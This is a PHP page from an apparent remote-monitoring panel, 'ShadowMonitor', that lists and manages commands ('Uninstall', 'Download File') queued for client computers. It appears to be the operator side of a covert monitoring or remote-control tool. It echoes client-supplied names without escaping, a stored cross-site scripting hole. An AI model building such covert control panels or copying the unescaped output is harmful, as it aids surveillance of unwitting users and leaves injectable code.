<?php
include 'include/panelSession.php';
include 'include/dbinfo.php';
?>
<html>
<head>
<link rel = "icon" type = "image/png" href = "images/favicon.png"/>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="description" content="ShadowMonitor Web Panel" />
<meta name="author" content="" />

<title>ShadowMonitor Web Panel</title>

	<!-- Global stylesheets -->
	<link href="https://fonts.googleapis.com/css?family=Roboto:400,300,100,500,700,900" rel="stylesheet" type="text/css">
	<link href="assets/css/icons/icomoon/styles.css" rel="stylesheet" type="text/css">
	<link href="assets/css/icons/fontawesome/styles.min.css" rel="stylesheet" type="text/css">
	<link href="assets/css/bootstrap.css" rel="stylesheet" type="text/css">
	<link href="assets/css/core.css" rel="stylesheet" type="text/css">
	<link href="assets/css/components.css" rel="stylesheet" type="text/css">
	<link href="assets/css/colors.css" rel="stylesheet" type="text/css">
	<!-- /global stylesheets -->

	<!-- Core JS files -->
	<script type="text/javascript" src="assets/js/plugins/notifications/sweet_alert.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/loaders/pace.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.11.4/jquery-ui.min.js"></script>

	<script type="text/javascript" src="assets/js/core/libraries/bootstrap.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/loaders/blockui.min.js"></script>
	<!-- /core JS files -->

	<!-- Theme JS files -->
	<!--Responsive datatables-->
	<script type="text/javascript" src="assets/js/plugins/tables/datatables/datatables.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/tables/datatables/extensions/responsive.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/forms/selects/select2.min.js"></script>
	<!--Switchery-->
	<script type="text/javascript" src="assets/js/plugins/forms/styling/uniform.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/forms/styling/switchery.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/forms/styling/switch.min.js"></script>
	
	<!-- Theme JS files -->
	<script type="text/javascript" src="assets/js/core/app.js"></script>
	<script type="text/javascript" src="assets/js/pages/datatables_responsive.js"></script>
	<script type="text/javascript" src="assets/js/pages/components_popups.js"></script>
	<script type="text/javascript" src="assets/js/plugins/forms/validation/validate.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/forms/selects/bootstrap_multiselect.js"></script>
	<script type="text/javascript" src="assets/js/plugins/forms/inputs/touchspin.min.js"></script>
	<script type="text/javascript" src="assets/js/pages/form_validation.js"></script>

	<!--/ theme js files-->

	<!--Custom styles-->
	<link rel = "stylesheet" type = "text/css" href = "style/custom.css">

		<!--Custom Scripts-->
<script src = "js/InitiateSwitchery.js"></script>
</head>

<body>

<!-- Page container -->
<div class="page-container">

<!-- Page content -->
<div class="page-content">

<?php include 'navigation/sidebar.php'; ?>

<script>
$("#commands").addClass('active');
</script>

<!-- Main content -->
<div class="content-wrapper">

<!-- Content area -->
<div class="content">
<?php include 'accountManager.php'; ?>

<?php
function GetCommand($command) {
switch ($command) {
case 0:
return "<center><img src = 'images/commands/uninstall.png'><br><label class = 'label label-info'>Uninstall</label></center>";
break;
case 1:
return "<center><img src = 'images/commands/download.png'><br><label class = 'label label-info'>Download File</label></center>";
break;
}
}

function CommandStatus($status) {
switch ($status) {
case 0:
return "<label class = 'label label-info'>Pending</label>";
break;
case 1:
return "<label class = 'label label-info'>Executed</label>";
break;
case 2:
return "<label class = 'label label-info'>Canceled</label>";
break;
}
}

/*
Select commandsTbl.auto,
commandsTbl.id commandId,
commandsTbl.type,
commandsTbl.status,
commandsTbl.submissionDate,
commandsTbl.carriedDate,
clients.id clientId,
clients.pcname,
downloads.clientId downloadId
From commands commandsTbl left join clients on commandsTbl.id = clients.id left join downloads on commandsTbl.id = downloads.clientId = commandsTbl.id Where clients.id = "ASD0IW8428348432" || downloads.clientId = commandsTbl.id order by commandsTbl.auto desc
*/

if (isset($_GET['clientId'])) {
$clientId = $_GET['clientId'];
$commands = $server->prepare("
Select DISTINCT commandsTbl.auto,
commandsTbl.id commandId,
commandsTbl.type,
commandsTbl.status,
commandsTbl.submissionDate,
commandsTbl.carriedDate,
clients.id clientId,
clients.pcname,
downloads.clientId downloadId
From commands commandsTbl left join clients on commandsTbl.id = clients.id left join downloads on commandsTbl.id = downloads.clientId Where clients.id = :clientId || downloads.clientId = :clientId order by commandsTbl.auto desc
");
$commands->bindParam(":clientId", $clientId, PDO::PARAM_STR);
$commands->execute();
} else {$commands = $server->query("
Select DISTINCT commandsTbl.auto,
commandsTbl.id commandId,
commandsTbl.type,
commandsTbl.status,
commandsTbl.submissionDate,
commandsTbl.carriedDate,
clients.id clientId,
clients.pcname,
downloads.clientId downloadId
From commands commandsTbl left join clients on commandsTbl.id = clients.id left join downloads on commandsTbl.id = downloads.clientId
");}
?>

<!--Commands-->
<div class = "panel panel-flat">
<div class = "panel-heading">
<center>
<div class = "panel-title"><span class = "text-bold">Commands</span></div>
</center>
</div>
<div class = "panel-body">
<table class = "table datatable-responsive" id = "commandsTbl">
<thead>
<tr style = "text-align:center">
<th>Command</th>
<th>Computer</th>
<th>Status</th>
<th>Submission Date</th>
<th>Carried Date</th>
<th>Action</th>
</tr>
</thead>
<tbody id = "commandHolder">
<?php
$ResetBtnVisibility = "display:none";
while ($command = $commands->fetch(PDO::FETCH_ASSOC)) {
?>
<tr id = "command<?php echo $command['auto']; ?>">
<!--Type-->
<td>
<span class = "commandType" data-commandType = "<?php echo $command['type']; ?>"><?php echo GetCommand($command['type']); ?></span></td>
<!--Computer-->
<td>
<?php
if ($command['commandId'] == "all") {echo "All";} else {echo $command['pcname'];}
?>
</td>
<!--Status-->
<td>
<span class = "commandStatus"><?php echo CommandStatus($command['status']); ?></span>
</td>
<!--Submission Date-->
<td><?php echo $command['submissionDate']; ?></td>
<!--Carried Date-->
<td class = "carriedDate">
<?php
$carriedDate = $command['carriedDate'];
if ($carriedDate == "") {
?>
-
<?php } else {echo $command['carriedDate'];} ?>
</td>
<!--Action-->
<td class = "actions">
<?php if ($command['status'] == 0) {
$ResetBtnVisibility = "display:none"; ?>
<button type = "button" onClick = "CancelCommand($(this));" class = "btn btn-danger" data-autoIncrement = "<?php echo $command['auto']; ?>" data-clientId = "<?php echo $command['commandId']; ?>">
<i class = "fa fa-remove"></i> Cancel
</button>
<?php } else { ?>
<button type = "button" class = "btn btn-info" onClick = "RemoveCommand($(this));" data-autoIncrement = "<?php echo $command['auto']; ?>" data-clientId = "<?php echo $command['commandId']; ?>">
<i class = "fa fa-remove"></i> Remove
</button>
<?php
}
if ($command['status'] == 2) {$ResetBtnVisibility = "";} ?>
<!--Reset Uninstall-->
<button style = "<?php echo $ResetBtnVisibility; ?>" type = "button" class = "btn btn-info ResetCommand" onClick = "ResetCommand($(this));" data-clientId = "<?php echo $command['commandId']; ?>" data-cmdType = "<?php echo $command['type']; ?>" data-autoIncrement = "<?php echo $command['auto']; ?>">
<i class = "fa fa-info"></i> Reset
</button>
</td>
</tr>
<?php } ?>
</tbody>
</table>
</div>
</div>

</div>
<!--/content area end-->
</div>
<!--/content wrapper end-->
</div>
<!--/page content end-->
</div>
<!--/page container end-->

<!--Scripts-->
<script>
//Cancel command
function CancelCommand(target) {
var cmdId = $(target).attr('data-autoIncrement')
var rowElement = $("#command" + cmdId);
var cmdType =  $(target).attr('data-cmdType')
swal({
type: "warning",
html: true,
title: "Are you sure",
text: "The command will be canceled, proceed?",
showCancelButton: true,
showConfirmButton: true,
cancelButtonText: "No",
confirmButtonText: "Yes"},
function(confirmed) {
if (confirmed) {
$.ajax({
type: "POST",
data: {cmdType: cmdType, cmdId: cmdId},
url: "commands/cancelCommand.php",
cache: false,
success: function() {
$(rowElement).effect('highlight', {color: "#263238"});
$.when($(rowElement)).done(function() {
location.reload();
});
}
});
}
});
}

//Remove command
function RemoveCommand(target) {
var id = $(target).attr('data-autoIncrement');
var clientId = $(target).attr('data-clientId');
var rowElement = $("#command" + id);
var commandStatus = $(rowElement).find('.commandStatus').text();
var cmdType = $(rowElement).find('.commandType').attr('data-commandType');

swal({
type: "warning",
html: true,
title: "Warning",
text: "The log will be <b>deleted</b>, proceed?",
showCancelButton: true,
cancelButtonText: "No",
showConfirmButton: true,
confirmButtonText: "Yes"},
function(confirmed) {
if (confirmed) {
$.ajax({
type: "POST",
data: {
clientId: clientId,
cmdType: cmdType
},
cache: false,
url: "cms/removeCommand.php",
success: function() {
$(rowElement).effect('highlight', {color: "#263238"});
$.when($(rowElement)).done(function() {
commandsTbl.row($(rowElement)).remove().draw();
});
}
});
}
});
}

function ResetCommand(target) {
var cmdId = $(target).attr('data-autoIncrement');
var rowElement = $("#command" + cmdId);
var cmdType =  $(target).attr('data-cmdType')
swal({
type: "info",
html: true,
title: "Reset Command",
text: "The command will be <b>queued</b>, proceed?",
showCancelButton: true,
cancelButtonText: "No",
showConfirmButton: true,
confirmButtonText: "Yes"},
function(confirmed) {
if (confirmed) {
$.ajax({
type: "POST",
data: {cmdType: cmdType, cmdId: cmdId},
cache: false,
url: "cms/resetCommand.php",
success: function() {
$(rowElement).effect('highlight', {color: "#263238"});
$.when($(rowElement)).done(function() {
location.reload();
});
}
});
}
});
}

$(document).ready(function() {
//Initialize switchery
InitiateSwitcheries(".switchery");

//Initialize datatable
commandsTbl = $("#commandsTbl").DataTable({
"columnDefs": [{
targets: [4]
}],
"paging": true,
"ordering": true,
"info": true,
"stateSave": "false"
});
});
</script>

<!--Required-->
<script src = "js/datatables/InitiatePaging.js"></script>
<script src = "js/datatables/InitiateFiltering.js"></script>
</body>
</html>